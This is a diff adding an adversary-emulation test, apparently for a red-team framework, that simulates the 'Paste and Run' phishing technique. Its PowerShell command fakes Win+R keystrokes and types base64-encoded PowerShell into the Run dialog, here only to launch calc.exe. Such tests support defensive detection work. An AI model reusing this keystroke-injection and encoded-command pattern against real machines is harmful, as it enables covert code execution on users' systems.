@@ -1,0 +1,38 @@
+---
+- id: 3322685a889bb005c20688f56ed022df
+  name: Paste and run technique
+  description: 'Tests the **Paste and Run** technique, where users are tricked into
+    running
+
+    malicious PowerShell commands by automating the Win+R command to open the
+
+    Run dialog and input `encoded PowerShell to execute calc.exe.`
+
+
+    - [Fake CAPTCHA Campaign](https://medium.com/@ahmed.moh.farou2/fake-captcha-campaign-on-arabic-pirated-movie-sites-delivers-lumma-stealer-4f203f7adabf)
+
+    - [From Clipboard to Compromise](https://www.proofpoint.com/us/blog/threat-insight/clipboard-compromise-powershell-self-pwn)
+
+    '
+  tactic: initial-access
+  technique:
+    attack_id: T1566.002
+    name: 'Phishing: Spearphishing Link'
+  platforms:
+    windows:
+      psh:
+        command: Add-Type @";     using System;     using System.Runtime.InteropServices;     public
+          class K {;         [DllImport("user32.dll")];         public static extern
+          void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);     };
+          "@; $VK_LWIN, $VK_R, $KEYDOWN, $KEYUP = 0x5B, 0x52, 0x0000, 0x0002; [K]::keybd_event($VK_LWIN,
+          0, $KEYDOWN, [UIntPtr]::Zero); [K]::keybd_event($VK_R, 0, $KEYDOWN, [UIntPtr]::Zero);
+          [K]::keybd_event($VK_R, 0, $KEYUP, [UIntPtr]::Zero); [K]::keybd_event($VK_LWIN,
+          0, $KEYUP, [UIntPtr]::Zero); Start-Sleep -Milliseconds 500; Add-Type -AssemblyName
+          System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait("cmd /c
+          powershell -ec " + [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('calc.exe'))
+          + "{ENTER}")
+        payloads: []
+        cleanup: ''
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
